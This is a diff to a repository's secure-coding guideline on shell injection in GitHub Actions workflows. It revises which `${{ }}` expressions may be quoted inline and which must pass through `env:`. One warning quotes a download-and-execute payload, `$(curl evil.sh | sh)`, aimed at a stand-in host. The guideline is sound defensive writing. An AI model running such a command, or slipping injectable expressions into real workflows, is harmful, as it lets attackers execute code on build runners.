@@ -556,18 +556,17 @@ GitHub substitutes a `${{ ... }}` expression as literal text **before** the shel
 sees the expression syntax itself, only whatever string came out of it. This makes the quoting around it a real
 security boundary, not a style choice.
 
-- **Always route every `${{ ... }}` expression through the step's `env:`, then reference the resulting shell
-  variable. No per-value judgment call — that judgment call is the bug.** This is the only pattern immune to
-  injection regardless of what the value contains or which expression source it comes from, because GitHub Actions
-  writes `env:` values into the runner's environment directly — the shell reads them as inert data and never
-  re-parses them for metacharacters, quotes, or command substitution. Deciding case by case whether a *particular*
-  `${{ }}` source is "safe enough" to skip this is exactly how `reason` and `bencher-branch` shipped single-quoted
-  directly in this repo's own reusable workflows: the source looked bounded at the time, or became less bounded
-  later without the `run:` step itself changing. Reaching for `env:` unconditionally costs a couple of extra lines
-  and removes the need to ever re-derive that judgment.
+- **`inputs.*` (`workflow_call` and `workflow_dispatch`) MUST always go through the step's `env:`, then reference
+  the resulting shell variable — no exceptions, no per-value judgment call.** This is the only pattern immune to
+  injection regardless of what the value contains, because GitHub Actions writes `env:` values into the runner's
+  environment directly — the shell reads them as inert data and never re-parses them for metacharacters, quotes, or
+  command substitution. Deciding case by case whether a *particular* input is "safe enough" to skip this is exactly
+  how `reason` and `bencher-branch` shipped single-quoted directly in this repo's own reusable workflows: the value
+  looked bounded at the time, or became less bounded later without the `run:` step itself changing. `inputs.*` is
+  the one category where that risk is real enough to make `env:` unconditional.
 
   ```yaml
-  # Always: every ${{ }} expression goes through env:, whatever its source
+  # Always: every inputs.* (and github.head_ref/ref_name -- see below) goes through env:
   - name: Compute release version
     env:
       MINVER_TAG_PREFIX: ${{ inputs.minver-tag-prefix }}
@@ -581,18 +580,33 @@ security boundary, not a style choice.
         )
   ```
 
-- **Pre-approved exceptions — the *only* expressions that MAY be single-quoted `'${{ ... }}'` directly instead of
-  going through `env:`:** `github.actor` (a platform-enforced identity string — GitHub usernames and `<name>[bot]`
-  app logins cannot contain a `'`, by GitHub's own account/app-registration rules, so there is nothing to escape),
-  `github.event_name` (a fixed enum GitHub itself defines), and a literal boolean/numeric constant. This is a
-  closed, named list, not a category to reason your way into: a `needs.*`/`steps.*` output, a `vars.*` value, a
-  job-computed enum, or anything else that merely *looks* bounded today does **not** qualify, no matter how safe it
-  seems — it goes through `env:`. The list exists precisely so you never again have to ask "is this one safe";
-  either it's on the list, or it isn't.
-- **Double-quoting `"${{ ... }}"` directly in the script is never correct, for anything, ever.** Bash evaluates
-  `$()`/backtick command substitution inside double quotes, so a value containing one (`$(curl evil.sh | sh)`)
-  executes it outright — this is strictly worse than a single-quoted value from outside the pre-approved list,
-  which at least requires a literal `'` to break out rather than a `$(`.
+- **`env.*`, `secrets.*`, and `vars.*` MAY be single-quoted `'${{ ... }}'` directly — they are written by whoever
+  has admin/write access to the repo (Settings → Variables/Secrets, or the workflow file's own `env:` block), never
+  by a `workflow_dispatch` input or PR content, so they sit outside the threat model this rule defends against.**
+  This is the same reasoning that already exempts `github.actor` and `github.event_name` below, generalized to the
+  other admin-controlled surfaces. **Caveat:** an `env.*` entry is only safe under this exception when *its own*
+  value is a literal string or itself `vars.*`/`secrets.*` — not when it merely forwards an `inputs.*` value one
+  level removed (e.g. a workflow-level `env: FOO: ${{ inputs.foo }}`, then `${{ env.FOO }}` used in a script). That
+  case carries `inputs.*`'s own risk and MUST follow the `inputs.*` rule above, not this one.
+- **`needs.*` and `steps.*` (job/step outputs, results, and conclusions) SHOULD go through `env:` by default, but
+  this is a preference, not an absolute.** Unlike `inputs.*`, some of these are provably safe on their own terms —
+  `needs.<job>.result`/`steps.<step>.conclusion` are platform-computed enums with a fixed vocabulary, no different
+  in kind from `github.event_name`. The default is `env:` because *verifying* which case you're in — "is this output
+  merely forwarding an `inputs.*` value, or is it independently safe?" — is exactly the error-prone tracking this
+  document exists to avoid; reach for `env:` first and skip it only when you can point to a specific, obvious reason
+  the value can't escape (and it costs nothing to route it anyway if you're unsure).
+- **Pre-approved, unconditionally safe: `github.actor`** (a platform-enforced identity string — GitHub usernames and
+  `<name>[bot]` app logins cannot contain a `'`, by GitHub's own account/app-registration rules, so there is nothing
+  to escape), **`github.event_name`** (a fixed enum GitHub itself defines), and **a literal boolean/numeric
+  constant**. These MAY be single-quoted directly with no caveat.
+- **Exception to the `env.*`/`github.*` exemption: `github.head_ref` and `github.ref_name` still MUST go through
+  `env:`.** Git ref and branch names are allowed to contain `'` — unlike `github.actor`, there is no platform-level
+  character restriction, and a fork PR's branch name is attacker-influenceable. Don't let "it's a `github.*`
+  context" be mistaken for "it's on the safe list."
+- **Double-quoting `"${{ ... }}"` directly in the script is never correct, for anything, ever — even for a value
+  that would otherwise be safe to single-quote.** Bash evaluates `$()`/backtick command substitution inside double
+  quotes, so a value containing one (`$(curl evil.sh | sh)`) executes it outright — this is strictly worse than
+  single-quoting an unsafe value, which at least requires a literal `'` to break out rather than a `$(`.
 - **Exception: concatenation with a live shell variable or string** (e.g.
   `preprocessor_symbols="$preprocessor_symbols;$DISPATCH_PREPROCESSOR_SYMBOLS"`, where
   `DISPATCH_PREPROCESSOR_SYMBOLS` was itself captured via `env:` first). Capture the `${{ }}` value into its own
